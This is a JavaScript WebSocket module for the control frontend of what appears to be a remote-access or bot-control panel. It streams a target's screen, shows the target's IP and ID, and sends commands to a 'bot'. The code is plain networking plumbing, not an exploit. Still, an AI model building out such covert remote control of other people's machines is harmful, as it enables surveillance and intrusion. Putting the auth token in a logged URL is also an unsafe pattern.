// frontend/client_control/js/modules/websocket/connection.js

import { AppState } from '../core/states.js';
import { decodePacket, encodePacket } from '../../../../dashboard/js/modules/websocket/protocol.js';
import { renderScreenRGBA } from '../features/screen_renderer.js';

let socket = null;
const $ = id => document.getElementById(id);

/** Обновляет текстовое содержимое UI элементов **/
const ui = (id, val) => { if ($(id)) $(id).textContent = val ?? '...'; };

/** Управляет визуальным статусом подключения **/
const setOnline = (on) => {
    const el = $('status-indicator');
    el?.classList.toggle('online', on);
    el?.classList.toggle('offline', !on);
    ui('status-text', on ? 'online' : 'offline');
};

/** Маршрутизация входящих пакетов по модулям **/
const handleIncomingData = (buf) => {
    const pkg = decodePacket(buf);
    if (!pkg) return;

    const { module, type, action, payload } = pkg;

    if (module === 'ScreenView') {
        // Если пришло уведомление о STOP от бота
        if (action === 'STOP') {
            console.log("[ScreenView] Bot requested stop");
            return window.resetRenderer?.();
        }

        if (type === 'bin') {
            // ОТЛАДКА: Раскомментируй, если хочешь видеть каждый пакет в консоли
            // console.debug(`[ScreenView] Frame received: ${payload.byteLength} bytes`);
            return renderScreenRGBA(payload);
        } else {
            // Это то самое место, где у тебя вылетала ошибка. 
            // Давай посмотрим, что внутри этого "str"
            console.warn(`[ScreenView] Unexpected type: ${type} | Action: ${action} | Payload:`, payload);
            return;
        }
    }

    if (module === 'SystemInfo') {
        const data = payload;
        if (data && typeof data === 'object') {
            if (data.ip) ui('display-ip', data.ip);
            if (data.id) ui('display-id', data.id);
        }
        return;
    }

    // Универсальный проброс для остальных
    window.dispatchEvent(new CustomEvent(`${module}:${action}`, { detail: payload }));
};

/** Инициализация WebSocket **/
export const initControlConnection = () => {
    const { clientId: tid } = AppState;
    const [token, login] = ['auth_token', 'user_login'].map(k => localStorage.getItem(k));
    
    if (!token || !tid) {
        console.error("[WS] Missing Auth Token or Target ID");
        return;
    }

    const protocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
    const url = `${protocol}//${location.host}/ws?token=${token}&login=${login}&mode=control&target=${encodeURIComponent(tid)}`;
    
    console.log(`[WS] Connecting to ${url}`);
    socket = new WebSocket(url);
    socket.binaryType = 'arraybuffer';
    
    socket.onopen = () => {
        console.log("[WS] Connection established");
        setOnline(true);
    };
    
    socket.onclose = (e) => {
        console.warn(`[WS] Connection closed: ${e.code} ${e.reason}`);
        setOnline(false);
    };

    socket.onerror = (e) => console.error("[WS] Socket Error:", e);
    
    socket.onmessage = (e) => handleIncomingData(e.data);

    /** Отправка команды на бот **/
    window.sendToBot = (modName, pay, action = 'None', extra = 'None') => {
        if (socket?.readyState !== 1) {
            console.warn("[WS] Cannot send: Socket not ready");
            return;
        }

        let type = 'str';
        if (pay instanceof ArrayBuffer || pay instanceof Uint8Array) type = 'bin';
        else if (typeof pay === 'number') type = 'int';
        else if (typeof pay === 'object') type = 'json';

        const packet = encodePacket(tid, modName, type, action, extra, pay);
        socket.send(packet);
    };
};